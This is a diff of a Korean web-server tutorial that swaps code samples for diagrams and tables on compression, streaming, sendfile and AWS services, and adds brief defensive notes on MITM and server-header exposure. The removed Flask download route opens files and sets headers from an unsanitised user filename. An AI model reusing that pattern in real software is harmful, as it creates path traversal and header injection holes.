+Brotli:     35 KB (93% 감소)
 
-**응답 크기 비교:**
-```
-원본: 500 KB
-Gzip: 50 KB (90% 감소)
+Content-Encoding: gzip
+Accept-Encoding: gzip, deflate, br
 ```
 
 ### 응답 스트리밍
 
-**대용량 파일 스트리밍:**
+**스트리밍 유형:**
 
-```python
-from flask import Flask, Response, stream_with_context
-
-app = Flask(__name__)
-
-@app.route('/download/<filename>')
-def download_file(filename):
-    def generate():
-        with open(f'/files/{filename}', 'rb') as f:
-            while True:
-                chunk = f.read(4096)
-                if not chunk:
-                    break
-                yield chunk
-
-    return Response(
-        stream_with_context(generate()),
-        mimetype='application/octet-stream',
-        headers={
-            'Content-Disposition': f'attachment; filename={filename}',
-            'X-Content-Type-Options': 'nosniff'
-        }
-    )
-
-@app.route('/stream')
-def stream():
-    def generate():
-        for i in range(100):
-            yield f'data: {i}\n\n'
-            time.sleep(0.1)
-
-    return Response(generate(), mimetype='text/event-stream')
 ```
+1. 파일 다운로드 스트리밍:
+┌────────────────────────────────────────────────────────────┐
+│ 전체 로딩 방식: 파일 전체 메모리에 로드 → 전송              │
+│   → 1GB 파일 = 1GB 메모리 사용 (비효율)                    │
+│                                                            │
+│ 청크 스트리밍: 4KB씩 읽어서 전송 (chunk by chunk)           │
+│   → 메모리 사용량 일정 (효율적)                            │
+└────────────────────────────────────────────────────────────┘
+
+2. Server-Sent Events (SSE):
+┌────────────────────────────────────────────────────────────┐
+│ Content-Type: text/event-stream                            │
+│                                                            │
+│ data: {"message": "Hello"}\n\n                             │
+│ data: {"message": "World"}\n\n                             │
+│ → 실시간 알림, 주식 시세, 채팅 등                          │
+└────────────────────────────────────────────────────────────┘
+
+3. Chunked Transfer Encoding:
+Transfer-Encoding: chunked
+→ Content-Length 없이 동적 크기 응답
+```
+
+**AWS 서비스 활용:**
+
+| 스트리밍 유형 | AWS 서비스 | 설명 |
+|-------------|-----------|------|
+| 파일 다운로드 | **S3 + CloudFront** | Range 요청 지원, 대용량 파일 |
+| 실시간 스트리밍 | **API Gateway WebSocket** | 양방향 통신 |
+| 이벤트 스트림 | **Kinesis** | 대용량 실시간 데이터 |
+| 미디어 스트리밍 | **MediaLive** | 라이브 비디오 스트리밍 |
 
 ---
 
@@ -1326,15 +1038,22 @@ http {
 
 ### 성능 최적화
 
-**sendfile() 시스템 콜:**
+**sendfile() 시스템 콜 (Zero-Copy):**
 
-```c
-// 일반 방식 (비효율적)
-read(file_fd, buffer, size);     // 커널 → 사용자 공간
-write(socket_fd, buffer, size);  // 사용자 공간 → 커널
+```
+일반 방식 (비효율):
+┌──────────────────────────────────────────────────────────┐
+│ 1. read(): 커널 버퍼 → 사용자 공간 (복사 1)              │
+│ 2. write(): 사용자 공간 → 커널 버퍼 (복사 2)             │
+│ → 2번의 데이터 복사, 컨텍스트 스위칭 발생                │
+└──────────────────────────────────────────────────────────┘
 
-// sendfile (효율적, zero-copy)
-sendfile(socket_fd, file_fd, offset, size);  // 커널 내부에서 직접 전송
+sendfile (Zero-Copy):
+┌──────────────────────────────────────────────────────────┐
+│ sendfile(): 커널 내부에서 직접 전송 (복사 0)             │
+│ → 사용자 공간 경유 없이 파일 → 소켓 직접 전송            │
+│ → 대용량 파일 전송 성능 크게 향상                        │
+└──────────────────────────────────────────────────────────┘
 ```
 
 **Nginx sendfile 설정:**
@@ -1557,6 +1276,37 @@ $ locust -f locustfile.py --host=http://www.example.com
 9. 연결 종료 또는 Keep-Alive
    [4-Way Handshake] 또는 [연결 유지]
 ```
+
+---
+
+## AWS 서비스 전체 요약
+
+| 카테고리 | AWS 서비스 | 웹 서버 개념 |
+|---------|-----------|-------------|
+| **컴퓨팅** | EC2 | 웹 서버 호스팅 (Nginx, Apache) |
+| | Lambda | 서버리스 요청 처리 |
+| | ECS / Fargate | 컨테이너화된 웹 서버 |
+| | Elastic Beanstalk | 관리형 웹 애플리케이션 배포 |
+| **네트워크** | ALB | HTTP/HTTPS 로드 밸런싱, 경로 기반 라우팅 |
+| | NLB | TCP/UDP 로드 밸런싱 |
+| | API Gateway | REST/WebSocket API 관리 |
+| | CloudFront | CDN, 정적 콘텐츠 캐싱 |
+| **데이터베이스** | RDS | 관계형 데이터베이스 |
+| | RDS Proxy | 연결 풀 관리, Lambda 최적화 |
+| | DynamoDB | 서버리스 NoSQL |
+| | ElastiCache | Redis/Memcached 캐싱 |
+| **보안** | WAF | SQL Injection, XSS 방어 |
+| | Shield | DDoS 방어 |
+| | Secrets Manager | DB 접속 정보 관리 |
+| | ACM | SSL/TLS 인증서 관리 |
+| **모니터링** | CloudWatch | 로그 수집, 메트릭 모니터링 |
+| | X-Ray | 분산 추적, 성능 분석 |
+
+> ⚠️ **보안 시나리오 - 웹 서버 응답 조작:**
+> 중간자 공격(MITM)으로 서버 응답을 가로채면 HTML에 악성 JavaScript를 주입하거나 다운로드 파일을 악성코드로 교체할 수 있습니다. HTTPS와 서브리소스 무결성(SRI)으로 방어해야 합니다.
+
+> ⚠️ **보안 시나리오 - 서버 정보 노출:**
+> `Server: Apache/2.4.41` 헤더가 노출되면 해당 버전의 알려진 취약점을 이용한 공격이 가능합니다. 서버 버전 정보는 숨기고, 에러 페이지에서 스택 트레이스가 노출되지 않도록 해야 합니다.
 
 ---
 
